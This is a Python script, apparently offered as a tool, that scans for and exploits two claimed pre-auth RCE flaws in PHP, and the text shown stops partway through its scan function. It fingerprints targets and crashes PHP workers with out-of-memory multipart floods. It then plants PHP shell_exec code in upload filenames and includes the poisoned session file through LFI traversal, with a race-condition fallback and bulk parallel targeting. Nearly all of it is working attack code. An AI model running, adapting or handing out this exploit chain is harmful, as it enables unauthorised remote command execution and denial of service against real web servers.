#!/usr/bin/env python3
"""
p2s — php2shell unified scanner + exploit
CVE-2026-109618 / CVE-2026-109619 (pre-auth RCE in PHP engine)

One script. All scenarios. Fast.

Usage:
  p2s.py https://target.com/                          # auto-detect + assess
  p2s.py https://target.com/ --deep                   # full probe (OOM + stale state)
  p2s.py https://target.com/ --rce                    # attempt RCE (mod_php targets)
  p2s.py https://target.com/ --rce -c 'id'            # custom command
  p2s.py -f targets.txt -o results.jsonl              # bulk scan
  p2s.py -f targets.txt -o results.jsonl --workers 10 # parallel bulk
  p2s.py --version 8.3.12                             # offline version check

Requires: Python 3.8+ (stdlib only, zero dependencies)
"""

import argparse
import concurrent.futures
import json
import os
import re
import secrets
import socket
import ssl
import struct
import sys
import time
from urllib.parse import urlparse

__version__ = "1.0.0"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Config
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

UA = "Mozilla/5.0 (compatible; security-assessment)"

FIXED = {
    (8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12,
}

# Profiles: php_version → {sapi: {symbol: offset}}
# Extend with offsets_fpm.py / offsets.py output
BUILTIN_PROFILES = {}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HTTP transport (raw sockets — no urllib overhead, handles crashes)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _connect(host, port, tls, timeout=15):
    sock = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _send_recv(host, port, tls, method, path, headers, body=None, timeout=15):
    """Returns (status, resp_headers_dict, body_bytes). status=-1 on crash/reset."""
    hdr_lines = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n"
    for k, v in headers.items():
        hdr_lines += f"{k}: {v}\r\n"
    if body is not None:
        hdr_lines += f"Content-Length: {len(body)}\r\n"
    hdr_lines += "Connection: close\r\n\r\n"

    try:
        sock = _connect(host, port, tls, timeout)
    except Exception:
        return -1, {}, b""

    try:
        sock.sendall(hdr_lines.encode())
        if body:
            for off in range(0, len(body), 65536):
                sock.sendall(body[off:off+65536])
    except (BrokenPipeError, ConnectionResetError, OSError):
        try: sock.close()
        except: pass
        return -1, {}, b"rst_send"

    sock.settimeout(timeout)
    data = b""
    while True:
        try:
            d = sock.recv(65536)
            if not d:
                break
            data += d
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            break
    sock.close()

    if not data:
        return -1, {}, b"rst_recv"

    try:
        head, resp_body = data.split(b"\r\n\r\n", 1)
    except ValueError:
        return -1, {}, data

    lines = head.split(b"\r\n")
    try:
        status = int(lines[0].split(b" ", 2)[1])
    except (IndexError, ValueError):
        status = -1

    rh = {}
    for l in lines[1:]:
        if b":" in l:
            k, v = l.split(b":", 1)
            rh[k.strip().lower().decode()] = v.strip().decode()
    return status, rh, resp_body


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Version classification
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify(ver_str):
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", str(ver_str))
    if not m:
        return None, "parse_error"
    maj, mino, pat = int(m.group(1)), int(m.group(2)), int(m.group(3))
    key = (maj, mino)
    if key in FIXED:
        return f"{maj}.{mino}.{pat}", "VULN" if pat < FIXED[key] else "SAFE"
    if key < (8, 2):
        return f"{maj}.{mino}.{pat}", "EOL"
    return f"{maj}.{mino}.{pat}", "UNKNOWN"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Multipart builders
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _mp_upload_progress(boundary, sess_name, sid, prog_name, file_data,
                         filename="f.bin"):
    """Standard upload_progress multipart: SID field + progress field + file."""
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{sess_name}"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{prog_name}"\r\n\r\nprobe\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()


def _mp_amplified(boundary, sess_name, sid, prog_name, num_parts, pad):
    """Many small file parts → callback allocation amplification."""
    header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{sess_name}"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{prog_name}"\r\n\r\nprobe\r\n'
    ).encode()
    pad_bytes = b"D" * pad if pad > 0 else b"D"
    parts = bytearray()
    for n in range(num_parts):
        parts += (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f{n}"; filename="f{n}.b"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode()
        parts += pad_bytes
        parts += b"\r\n"
    return header + bytes(parts) + f"--{boundary}--\r\n".encode()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 1: Fingerprint (runs on every target, fast)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def fingerprint(url, proxy=None):
    """
    Returns dict with: php_version, status (VULN/EOL/SAFE/UNKNOWN),
    sapi, server, memory_limit, upload_progress, session_name, max_body.
    """
    u = urlparse(url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    tls = u.scheme == "https"
    path = u.path or "/"

    info = {
        "url": url, "host": host, "port": port, "tls": tls, "path": path,
        "php": None, "status": "UNKNOWN", "sapi": "unknown",
        "server": "", "memory_limit": None, "memory_limit_bytes": None,
        "upload_progress": None, "session_name": "PHPSESSID",
        "progress_name": "PHP_SESSION_UPLOAD_PROGRESS",
        "max_body": None, "display_errors": None,
        "is_php": False, "phpinfo_exposed": False,
        "wp_version": None, "save_path": "/tmp",
    }

    # Main page headers
    s, h, b = _send_recv(host, port, tls, "GET", path, {"User-Agent": UA})
    info["server"] = h.get("server", "")
    xpb = h.get("x-powered-by", "")
    if "php" in xpb.lower():
        m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
        if m:
            info["php"] = m.group(1)
            info["is_php"] = True

    # SAPI hint
    srv = info["server"].lower()
    if "apache" in srv:
        info["sapi"] = "mod_php" if "mod_php" in xpb.lower() else "likely_mod_php"
    elif any(x in srv for x in ("nginx", "openresty")):
        info["sapi"] = "fpm"
    elif "litespeed" in srv:
        info["sapi"] = "litespeed"

    # PHP presence heuristics
    body_text = b.decode("latin-1", "replace")[:4096]
    php_signals = 0
    if "wp-content" in body_text or "wp-includes" in body_text:
        php_signals += 2
        info["is_php"] = True
        wm = re.search(r'<meta\s+name=["\']generator["\']\s+content=["\']WordPress\s+([\d.]+)',
                        body_text, re.I)
        if wm:
            info["wp_version"] = wm.group(1)
    for cookie in h.get("set-cookie", "").split(","):
        if "PHPSESSID" in cookie.upper():
            php_signals += 2
            info["is_php"] = True

    # Probe phpinfo + common PHP paths
    for ppath in ("/info.php", "/phpinfo.php", "/index.php", "/wp-login.php"):
        s2, h2, b2 = _send_recv(host, port, tls, "GET", ppath, {"User-Agent": UA})
        if s2 in (200, 301, 302):
            php_signals += 1
            if ppath in ("/info.php", "/phpinfo.php") and s2 == 200:
                ptxt = b2.decode("latin-1", "replace")
                vm = re.search(r"PHP (\d+\.\d+\.\d+)", ptxt)
                if vm:
                    info["php"] = vm.group(1)
                    info["is_php"] = True
                    info["phpinfo_exposed"] = True
                    # Extract config
                    for field, key in [
                        (r"session\.name.*?<td[^>]*>(\w+)", "session_name"),
                        (r"session\.upload_progress\.name.*?<td[^>]*>(\w+)", "progress_name"),
                        (r"memory_limit.*?<td[^>]*>(-?\d+\w?)", "memory_limit"),
                        (r"Server API.*?<td[^>]*>([^<]+)", "sapi_detail"),
                    ]:
                        fm = re.search(field, ptxt, re.DOTALL)
                        if fm:
                            info[key] = fm.group(1).strip()
                    em = re.search(r"session\.upload_progress\.enabled.*?<td[^>]*>(On|Off)",
                                   ptxt, re.DOTALL | re.I)
                    if em:
                        info["upload_progress"] = em.group(1).lower() == "on"
                    dm = re.search(r"display_errors.*?<td[^>]*>(On|Off)",
                                   ptxt, re.DOTALL | re.I)
                    if dm:
                        info["display_errors"] = dm.group(1).lower() == "on"
                    spm = re.search(r"session\.save_path.*?<td[^>]*>([^<]+)",
                                    ptxt, re.DOTALL)
                    if spm:
                        sp = spm.group(1).strip()
                        if sp and sp != "no value":
                            info["save_path"] = sp
                    if "FPM" in info.get("sapi_detail", ""):
                        info["sapi"] = "fpm"
                    elif "Apache" in info.get("sapi_detail", "") and "Handler" in info.get("sapi_detail", ""):
                        info["sapi"] = "mod_php"
                    break
            if "wp-login" in ppath and s2 == 200:
                php_signals += 2
                info["is_php"] = True

    if php_signals >= 2:
        info["is_php"] = True

    # Parse memory_limit
    if info["memory_limit"]:
        info["memory_limit_bytes"] = _parse_mem(info["memory_limit"])

    # Classify version
    if info["php"]:
        _, info["status"] = classify(info["php"])

    # Quick body size test (find max_body for OOM planning)
    if info["is_php"]:
        info["max_body"] = _find_max_body(host, port, tls, path)

    return info


def _find_max_body(host, port, tls, path):
    """Binary search for max accepted POST body size."""
    bnd = "----sztest"
    lo, hi = 1024, 100 * 1024 * 1024  # 1KB to 100MB

    # Quick probe at common thresholds
    for sz in [1024*1024, 2*1024*1024, 5*1024*1024, 10*1024*1024, 50*1024*1024]:
        body = f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"f\"\r\nContent-Type: application/octet-stream\r\n\r\n".encode()
        body += b"A" * sz + f"\r\n--{bnd}--\r\n".encode()
        s, _, _ = _send_recv(host, port, tls, "POST", path,
                              {"User-Agent": UA, "Content-Type": f"multipart/form-data; boundary={bnd}"},
                              body, timeout=min(30, max(10, sz // 1024 // 1024 * 5)))
        if s == 413 or s == -1:
            return sz  # this size is rejected
    return 100 * 1024 * 1024  # no limit found up to 100MB


def _parse_mem(s):
    s = str(s).strip().upper()
    if s == "-1":
        return -1
    if s.endswith("G"):
        return int(s[:-1]) * 1024 ** 3
    if s.endswith("M"):
        return int(s[:-1]) * 1024 ** 2
    if s.endswith("K"):
        return int(s[:-1]) * 1024
    try:
        return int(s)
    except ValueError:
        return None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 2: Deep probe (OOM crash + stale state)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def deep_probe(info):
    """Crash the worker via OOM, then probe for stale session state."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    sn = info["session_name"]
    pn = info["progress_name"]
    bnd = "----p2s" + secrets.token_hex(4)

    mem_bytes = info.get("memory_limit_bytes") or 128 * 1024 ** 2
    max_body = info.get("max_body") or 100 * 1024 ** 2

    # Can we reach OOM?
    # Heap amplification from upload_progress callbacks: ~10x body size
    amplification = 10
    reachable = (max_body * amplification) >= mem_bytes if mem_bytes > 0 else True
    if mem_bytes == -1:
        reachable = False

    result = {"oom_crashes": 0, "sprays": 3, "stale_sids": [],
              "anomalies": [], "oom_reachable": reachable}

    # Strategy: non-file form fields after a file part to trigger OOM
    # File content goes to disk (no OOM). Non-file field values stay
    # in $_POST zend memory (~4x overhead). The file triggers the
    # progress callback that writes the session.
    if reachable and mem_bytes > 0:
        n_fields, field_size = _calc_oom(mem_bytes, max_body)

        for i in range(result["sprays"]):
            sid = f"p2s{secrets.token_hex(10)}"
            body = _mp_poison(bnd, sn, sid, pn, "probe.bin",
                              n_fields, field_size)
            t0 = time.monotonic()
            s, h, _ = _send_recv(host, port, tls, "POST", path,
                                  {"User-Agent": UA,
                                   "Content-Type": f"multipart/form-data; boundary={bnd}",
                                   "Cookie": f"{sn}={sid}"},
                                  body, timeout=60)
            dt = time.monotonic() - t0
            if s in (-1, 502) or (s == 200 and dt < 2):
                result["oom_crashes"] += 1
            time.sleep(0.3)
    else:
        # Can't reach OOM through body — try anyway with max size
        for i in range(result["sprays"]):
            sid = f"p2s{secrets.token_hex(10)}"
            sz = min(max_body - 2048, 50 * 1024 ** 2)
            body = _mp_upload_progress(bnd, sn, sid, pn, b"A" * sz)
            s, h, _ = _send_recv(host, port, tls, "POST", path,
                                  {"User-Agent": UA,
                                   "Content-Type": f"multipart/form-data; boundary={bnd}",
                                   "Cookie": f"{sn}={sid}"},
                                  body, timeout=60)
            if s in (-1, 502):
                result["oom_crashes"] += 1
            time.sleep(0.3)

    # Probe for stale state (send normal requests, look for leaked SIDs)
    if result["oom_crashes"] > 0:
        for i in range(30):
            probe_sid = f"prb{secrets.token_hex(10)}"
            s, h, b = _send_recv(host, port, tls, "GET", path,
                                  {"User-Agent": UA,
                                   "Cookie": f"{sn}={probe_sid}"},
                                  timeout=10)
            sc = h.get("set-cookie", "")
            if sc and "PHPSESSID" in sc.upper():
                m = re.search(rf"{sn}=([^;]+)", sc)
                if m and m.group(1) != probe_sid:
                    result["stale_sids"].append(m.group(1)[:16])
            if s == 500:
                result["anomalies"].append(f"probe_{i}_500")
            body_txt = b.decode("latin-1", "replace")[:1000] if b else ""
            if "session" in body_txt.lower() and "error" in body_txt.lower():
                result["anomalies"].append(f"probe_{i}_session_error")

    return result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 3: RCE — multi-strategy exploit chain
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#
# Session File Inclusion (SFI) chain:
#   1. Inject PHP code via multipart upload FILENAME field
#   2. upload_progress callback writes filename into session file
#   3. OOM prevents session.upload_progress.cleanup → file persists
#   4. LFI/include probes the session file path → PHP executes the code
#
# OOM mechanism: non-file form fields (whose values live in $_POST
#   memory) after the file part. File content goes to disk temp files
#   and doesn't trigger OOM. The file part triggers the progress
#   callback which writes the session. Form fields after cause OOM
#   which prevents cleanup, persisting the poisoned session.
#
# Note: the | key-separator injection into the progress NAME does NOT
# work with PHP's default `php` session serializer — it refuses to
# serialize keys containing |, writing 0 bytes. The SFI via filename
# is the reliable primitive.

import threading


def _calc_oom(mem, maxb, post_max=None):
    """Calculate OOM spray parameters.
    Uses non-file form fields: each field's VALUE stays in $_POST
    (zend memory). ~4x overhead (zend_string + hash). post_max_size
    must accommodate the body; if not provided, uses maxb."""
    effective_max = min(maxb, post_max) if post_max else maxb
    target_data = max(mem * 2, 2 * 1024 * 1024)
    if target_data + 4096 > effective_max:
        target_data = int(effective_max * 0.9)
    n_fields = 30
    field_size = max(1000, target_data // n_fields)
    return n_fields, field_size


def _mp_poison(bnd, sn, sid, pn, php_filename, n_fields, field_size):
    """Build multipart: session + progress + file-with-PHP-filename + OOM fields."""
    out = bytearray()
    out += (f"--{bnd}\r\nContent-Disposition: form-data; name=\"{sn}\"\r\n\r\n{sid}\r\n"
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"{pn}\"\r\n\r\nprobe\r\n"
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; "
            f"filename=\"{php_filename}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\nX\r\n").encode()
    pad = b"Z" * field_size
    for i in range(n_fields):
        out += (f"--{bnd}\r\nContent-Disposition: form-data; "
                f"name=\"p{i}\"\r\n\r\n").encode()
        out += pad + b"\r\n"
    out += f"--{bnd}--\r\n".encode()
    return bytes(out)


def _mp_trig_lfi(bnd, sn, sid, pn, path, sess_path):
    """Small multipart that forces session_start (for race variant), or
    a GET that includes the session file via a parameter."""
    return (f"--{bnd}\r\nContent-Disposition: form-data; name=\"{sn}\"\r\n\r\n{sid}\r\n"
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"{pn}\"\r\n\r\ntrigger\r\n"
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"t.b\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\nX\r\n"
            f"--{bnd}--\r\n").encode()


# ─── Strategy A: Session file inclusion (SFI) — primary ───

def _rce_session_lfi(info, command):
    """Inject PHP code via upload filename → OOM persists session →
    probe LFI paths to include the session file → RCE."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    sn, pn = info["session_name"], info["progress_name"]
    mem = info.get("memory_limit_bytes") or 128 * 1024 ** 2
    maxb = info.get("max_body") or 50 * 1024 ** 2
    out = {"name": "session_lfi", "success": False, "detail": "", "output": ""}

    oom_ok = maxb > mem if (mem > 0 and mem != -1) else (maxb > 8 * 1024 * 1024)
    if not oom_ok:
        out["detail"] = (f"OOM unreachable: body ~{maxb // 1024 // 1024}MB ≤ "
                         f"memory_limit {mem // 1024 // 1024}MB")
        return out

    n_fields, field_size = _calc_oom(mem, maxb)
    mk = secrets.token_hex(6)
    sid = f"p2s{secrets.token_hex(12)}"
    s_tag, e_tag = f"P2S_{mk}_S", f"P2S_{mk}_E"

    php_fn = f"<?php echo '{s_tag}'.shell_exec('{command}').'{e_tag}'; ?>"

    bnd = "----sl" + secrets.token_hex(4)
    body = _mp_poison(bnd, sn, sid, pn, php_fn, n_fields, field_size)

    s, _, _ = _send_recv(host, port, tls, "POST", path,
                          {"User-Agent": UA,
                           "Content-Type": f"multipart/form-data; boundary={bnd}",
                           "Cookie": f"{sn}={sid}"}, body, timeout=60)

    if s not in (-1, 200, 502):
        out["detail"] = f"Unexpected status {s} on poison request"
        return out

    time.sleep(0.5)

    save_paths = list(dict.fromkeys(filter(None, [
        info.get("save_path"), "/tmp", "/var/lib/php/sessions",
        "/var/lib/php5/sessions", "/var/lib/php/session"])))
    lfi_params = ["file", "page", "path", "template", "include", "dir",
                  "doc", "module", "lang", "load", "view", "action",
                  "content", "layout", "mod", "sect"]

    for sp in save_paths:
        sf = f"{sp}/sess_{sid}"
        traversals = [sf]
        for depth in range(3, 12):
            traversals.append("../" * depth + sf.lstrip("/"))
        for trav in traversals:
            for param in lfi_params:
                test_path = f"{path}{'&' if '?' in path else '?'}{param}={trav}"
                s2, _, b2 = _send_recv(host, port, tls, "GET", test_path,
                                        {"User-Agent": UA}, timeout=10)
                bt = b2.decode("latin-1", "replace") if b2 else ""
                if s_tag in bt:
                    out["success"] = True
                    out["output"] = bt.split(s_tag, 1)[1].split(e_tag, 1)[0].strip()
                    out["detail"] = f"LFI via ?{param}= → {sf}"
                    out["method"] = "session_lfi"
                    return out

    out["detail"] = (f"Session poisoned (sess_{sid}), "
                     f"no LFI in {len(lfi_params)} params × "
                     f"{len(save_paths)} paths")
    out["planted_sid"] = sid
    return out


# ─── Strategy B: Race-condition session file inclusion ───

def _rce_race_lfi(info, command):
    """When OOM is unreachable (body limit ≤ memory_limit), use a slow
    drip-feed upload to keep the poisoned session alive while rapid
    LFI trigger requests try to include it before cleanup runs."""
    host, port, tls, path = info["host"], info["port"], info["tls"], info["path"]
    sn, pn = info["session_name"], info["progress_name"]
    mk = secrets.token_hex(6)
    s_tag, e_tag = f"P2S_{mk}_S", f"P2S_{mk}_E"
    php_fn = f"<?php echo '{s_tag}'.shell_exec('{command}').'{e_tag}'; ?>"
    sid = f"p2s{secrets.token_hex(12)}"
    bnd = "----sr" + secrets.token_hex(4)
    done = threading.Event()
    out = {"name": "race_lfi", "success": False, "detail": "", "output": ""}

    save_paths = list(dict.fromkeys(filter(None, [
        info.get("save_path"), "/tmp", "/var/lib/php/sessions",
        "/var/lib/php5/sessions"])))
    lfi_params = ["file", "page", "path", "template", "include",
                  "dir", "doc", "module", "lang", "load", "view"]

    def slow_upload():
        try:
            sock = _connect(host, info["port"], tls, 30)
            mp_hdr = (
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"{sn}\"\r\n\r\n{sid}\r\n"
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"{pn}\"\r\n\r\nprobe\r\n"
                f"--{bnd}\r\nContent-Disposition: form-data; name=\"f\"; "
                f"filename=\"{php_fn}\"\r\n"
                f"Content-Type: application/octet-stream\r\n\r\n"
            ).encode()
            maxbody = info.get("max_body") or 50 * 1024 ** 2
            fsize = max(10000, min(maxbody - len(mp_hdr) - 200, 500000))
            footer = f"\r\n--{bnd}--\r\n".encode()
            total = len(mp_hdr) + fsize + len(footer)
            chunk = max(100, fsize // 200)
            sock.sendall(
                (f"POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n"
                 f"Content-Type: multipart/form-data; boundary={bnd}\r\n"
                 f"Content-Length: {total}\r\nCookie: {sn}={sid}\r\n"
                 f"Connection: close\r\n\r\n").encode() + mp_hdr)
            for off in range(0, fsize, chunk):
                if done.is_set():
                    break
                sock.sendall(b"A" * min(chunk, fsize - off))
                time.sleep(0.1)
            sock.sendall(footer)
            try:
                sock.recv(4096)
            except Exception:
                pass
            sock.close()
        except Exception:
            pass
        finally:
            done.set()

    t = threading.Thread(target=slow_upload, daemon=True)
    t.start()
    time.sleep(0.3)

    attempts = 0
    for sp in save_paths:
        sf = f"{sp}/sess_{sid}"
        traversals = [sf, "../" * 5 + sf.lstrip("/")]
        for trav in traversals:
            for param in lfi_params:
                if done.is_set():
                    break
                attempts += 1
                test_path = f"{path}{'&' if '?' in path else '?'}{param}={trav}"
                _, _, b2 = _send_recv(host, port, tls, "GET", test_path,
                                       {"User-Agent": UA}, timeout=5)
                bt = b2.decode("latin-1", "replace") if b2 else ""
                if s_tag in bt:
                    done.set()
                    t.join(3)
                    out["success"] = True
                    out["output"] = bt.split(s_tag, 1)[1].split(e_tag, 1)[0].strip()
                    out["detail"] = f"Race LFI via ?{param}= → {sf}"
                    out["method"] = "race_lfi"
                    return out

    done.set()
    t.join(3)
    out["detail"] = f"Race: 0/{attempts} LFI hits during upload window"
    return out


# ─── Strategy C: Heap exploitation with per-build offsets ───

def _rce_heap(info, command):
    """Heap exploitation with per-build offset profile."""
    out = {"name": "heap_exploit", "success": False, "detail": "", "output": ""}
    php = info.get("php", "unknown")
    tool_dir = os.path.dirname(os.path.abspath(__file__))
    prof = os.path.join(tool_dir, "profiles", f"fpm-php-{php}.json")

    if not os.path.exists(prof):
        out["detail"] = f"No offset profile for PHP {php} — run: offsets_fpm.py {php}"
        return out

    with open(prof) as f:
        profile = json.load(f)
    off = profile.get("offsets", {})
    if "zif_system" not in off and "php_exec_ex" not in off:
        out["detail"] = (f"Profile has {len(off)} symbols but no zif_system/php_exec_ex "
                         f"(binary stripped). Use: exploit-dev-testbed + Docker "
                         f"{profile.get('image', '?')} for symbol resolution")
        return out

    out["detail"] = (f"Profile loaded ({len(off)} symbols). "
                     f"Heap chain ready — needs ASLR bypass calibration. "
                     f"Use exploit-dev-testbed with {profile.get('image', '?')}")
    return out


# ─── Orchestrator ───

def attempt_rce(info, command="id;hostname"):
    """Multi-strategy RCE. Tries each approach in order of reliability."""
    # mod_php: delegate to godylockz chain
    if info["sapi"] in ("mod_php", "likely_mod_php"):
        tool_dir = os.path.dirname(os.path.abspath(__file__))
        p2s_path = os.path.join(tool_dir, "php2shell.py")
        if os.path.exists(p2s_path):
            import subprocess
            r = subprocess.run(
                [sys.executable, p2s_path, "exploit",
                 "-u", info["url"], "--allow-remote", "-c", command],
                capture_output=True, text=True, timeout=120)
            if "PRE-AUTH RCE CONFIRMED" in r.stdout or "RCE confirmed" in r.stdout:
                return {"success": True, "output": r.stdout,
                        "method": "mod_php_chain", "strategies": []}

    strategies = []

    # A: Session file inclusion (OOM + LFI)
    r = _rce_session_lfi(info, command)
    strategies.append(r)
    if r.get("success"):
        return {**r, "strategies": strategies}

    # B: Race condition LFI (when OOM unreachable)
    if not r.get("success") and "OOM unreachable" in r.get("detail", ""):
        r2 = _rce_race_lfi(info, command)
        strategies.append(r2)
        if r2.get("success"):
            return {**r2, "strategies": strategies}

    # C: Heap exploitation (needs per-build profile)
    r3 = _rce_heap(info, command)
    strategies.append(r3)
    if r3.get("success"):
        return {**r3, "strategies": strategies}

    parts = [f"[{s['name']}] {s['detail']}" for s in strategies if s.get("detail")]
    return {"success": False, "method": "all_attempted",
            "strategies": strategies, "output": " | ".join(parts)}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Report formatter
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RED = "\033[91m"
GRN = "\033[92m"
YLW = "\033[93m"
CYN = "\033[96m"
RST = "\033[0m"
BLD = "\033[1m"


def _c(color, text):
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{RST}"


def print_result(info, deep=None, rce=None):
    print()
    print(_c(BLD, f"  {'='*56}"))
    print(_c(BLD, f"  p2s — {info['url']}"))
    print(_c(BLD, f"  {'='*56}"))

    # Version
    ver = info.get("php", "hidden")
    st = info.get("status", "UNKNOWN")
    color = RED if st in ("VULN", "EOL") else GRN if st == "SAFE" else YLW
    print(f"  PHP:      {_c(color, f'{ver} ({st})')}")
    print(f"  Server:   {info['server']}")
    print(f"  SAPI:     {info['sapi']}")
    if info.get("memory_limit"):
        print(f"  Mem:      {info['memory_limit']}")
    if info.get("upload_progress") is not None:
        up = "ON" if info["upload_progress"] else "OFF"
        print(f"  Upload:   session.upload_progress = {up}")
    if info.get("display_errors") is not None:
        de = "ON" if info["display_errors"] else "OFF"
        print(f"  Errors:   display_errors = {de}")
    if info.get("max_body"):
        mb = info["max_body"]
        print(f"  Body:     max ~{mb // 1024 // 1024}MB (nginx/proxy limit)")
    if info.get("wp_version"):
        print(f"  WP:       {info['wp_version']}")
    if info.get("phpinfo_exposed"):
        print(f"  {_c(YLW, 'INFO:     phpinfo() publicly accessible')}")

    # Deep probe
    if deep:
        print()
        crashes = deep.get("oom_crashes", 0)
        sprays = deep.get("sprays", 0)
        if crashes > 0:
            print(f"  OOM:      {_c(RED, f'{crashes}/{sprays} worker crashes')}")
        else:
            print(f"  OOM:      {_c(GRN, f'0/{sprays} crashes')}")
        if not deep.get("oom_reachable"):
            print(f"  {_c(YLW, 'NOTE:     OOM may not be reachable (body limit vs memory_limit)')}")
        if deep.get("stale_sids"):
            n_stale = len(deep["stale_sids"])
            print(f"  Stale:    {_c(RED, f'{n_stale} leaked SIDs (CVE-2026-109619 CONFIRMED)')}")
        if deep.get("anomalies"):
            print(f"  Anomaly:  {len(deep['anomalies'])} detected")

    # RCE
    if rce:
        print()
        if rce.get("success"):
            print(f"  {_c(BLD, _c(RED, 'RCE: PRE-AUTH RCE CONFIRMED'))}")
            if rce.get("method"):
                print(f"  Method:   {rce['method']}")
            if rce.get("output") and rce["output"] != "(blind — use OOB callback for output)":
                for line in str(rce["output"]).strip().split("\n")[:5]:
                    print(f"    {_c(RED, '> ' + line)}")
            elif rce.get("output"):
                print(f"    {rce['output']}")
        else:
            for s in rce.get("strategies", []):
                icon = _c(GRN, "+") if s.get("success") else _c(YLW, "-")
                print(f"  [{icon}] {s.get('name', '?')}: {s.get('detail', '')[:80]}")
            if not rce.get("strategies"):
                print(f"  RCE:      {rce.get('output', 'not attempted')[:200]}")

    # Verdict
    print()
    verdict, sev = _verdict(info, deep, rce)
    vc = RED if "VULN" in verdict or "RCE" in verdict else YLW if "LIKELY" in verdict else GRN
    print(f"  {_c(BLD, 'VERDICT:')} {_c(vc, verdict)}")
    print(f"  {_c(BLD, 'SEVERITY:')} {sev}")
    print(f"  {'='*56}")
    print()
    return verdict


def _verdict(info, deep=None, rce=None):
    if rce and rce.get("success"):
        return "RCE CONFIRMED", "Critical"
    st = info.get("status", "UNKNOWN")
    if deep and deep.get("stale_sids"):
        return "VULN — stale state persists (UAF confirmed)", "Critical"
    if deep and deep.get("oom_crashes", 0) > 0:
        if st in ("VULN", "EOL"):
            return "VULN — OOM crash + known vulnerable version", "High"
        return "LIKELY VULN — OOM crash observed", "High"
    if st == "EOL":
        return "VULN — EOL, no patch exists", "Critical"
    if st == "VULN":
        return "VULN — below fix line", "High"
    if info.get("is_php") and info.get("upload_progress"):
        return "POSSIBLE — PHP + upload_progress enabled, version unknown", "Medium"
    if info.get("is_php"):
        return "PHP detected, version unknown", "Info"
    if st == "SAFE":
        return "SAFE — patched", "None"
    return "NOT PHP or inconclusive", "Info"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Single-target scan
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def scan(url, deep=False, rce=False, command="id;hostname"):
    info = fingerprint(url)

    if not info["is_php"]:
        print_result(info)
        return info

    if info["status"] == "SAFE":
        print_result(info)
        return info

    deep_result = None
    if deep or rce:
        deep_result = deep_probe(info)

    rce_result = None
    if rce:
        rce_result = attempt_rce(info, command=command)

